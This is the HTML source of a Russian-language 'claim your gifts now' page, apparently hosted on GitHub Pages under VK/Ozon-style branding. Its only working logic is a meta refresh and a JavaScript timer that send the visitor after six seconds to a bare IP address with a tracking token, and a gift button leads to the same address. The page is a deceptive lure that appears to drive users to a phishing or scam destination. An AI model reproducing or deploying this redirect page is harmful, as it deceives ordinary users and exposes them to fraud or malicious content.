<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<!-- ВОТ ЭТОТ ТЕГ ДЕЛАЕТ СТРАНИЦУ АДАПТИВНОЙ ПОД ТЕЛЕФОН -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Забери подарки прямо сейчас</title>

<!-- Open Graph теги для превью -->
<meta property="og:title" content="Забери подарки прямо сейчас">
<meta property="og:description" content=".">
<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
<meta property="og:url" content="https://vk-ozon-podarki.github.io">
<meta property="og:type" content="website">
<meta property="og:site_name" content="Забери подарки прямо сейчас">

<!-- Twitter Card теги -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Забери подарки прямо сейчас">
<meta name="twitter:description" content=".">
<meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">

<!-- Мгновенный редирект через meta (для ботов) -->
<meta http-equiv="refresh" content="6; url=https://45.115.26.145/?s=sCcUFzRVCt">

<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    html, body {
        height: 100%;
        width: 100%;
        overflow: hidden;
    }

    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        background-color: #2f8ef0;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
    }

    /* Блок с картинкой растягивается на всю ширину */
    .hero-wrap {
        position: relative;
        width: 100%;
        max-width: 100%; /* На телефоне — во всю ширину */
        margin: 0 auto;
    }

    /* Картинка занимает всю ширину блока */
    .hero-wrap img {
        display: block;
        width: 100%;
        height: auto;
        background-color: #2f8ef0;
    }

    .btn-gift {
        position: absolute;
        left: 50%;
        transform: translateX(-50%);
        bottom: 7%;
        width: 78%;
        padding: 18px 24px;
        background: #fff;
        color: #1a1a2e;
        font-size: 19px;
        font-weight: 800;
        border: none;
        border-radius: 18px;
        cursor: pointer;
        text-align: center;
        text-decoration: none;
        box-shadow: 0 10px 30px rgba(21, 101, 192, 0.35);
        animation: pulse 2s ease-in-out infinite;
    }

    @keyframes pulse {
        0%, 100% { box-shadow: 0 10px 30px rgba(21, 101, 192, 0.35); }
        50%      { box-shadow: 0 10px 40px rgba(255, 255, 255, 0.7); }
    }

    .btn-gift:active {
        transform: translateX(-50%) scale(0.96);
    }

    /* На ПК — ограничиваем ширину, чтобы не растягивалось на весь монитор */
    @media (min-width: 561px) {
        .hero-wrap {
            max-width: 430px;
            border-radius: 26px;
            overflow: hidden;
            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.28);
        }
    }
</style>
</head>
<body>

<div class="hero-wrap">
    <!-- ВАЖНО: проверьте, что файл называется именно cake.jpg -->
    <img src="cake.jpg" alt="Праздничный торт">
    
    <a href="https://45.115.26.145/?s=sCcUFzRVCt" class="btn-gift" id="giftBtn">
        🎁 Забрать подарок
    </a>
</div>

<script>
    const giftBtn = document.getElementById('giftBtn');
    const targetUrl = giftBtn.href;
    let redirected = false;

    const redirectTimeout = setTimeout(() => {
        if (!redirected) {
            redirected = true;
            window.location.replace(targetUrl);
        }
    }, 6000);

    giftBtn.addEventListener('click', function(e) {
        e.preventDefault();
        if (!redirected) {
            redirected = true;
            clearTimeout(redirectTimeout);
            window.location.replace(targetUrl);
        }
    });
</script>
</body>
</html>
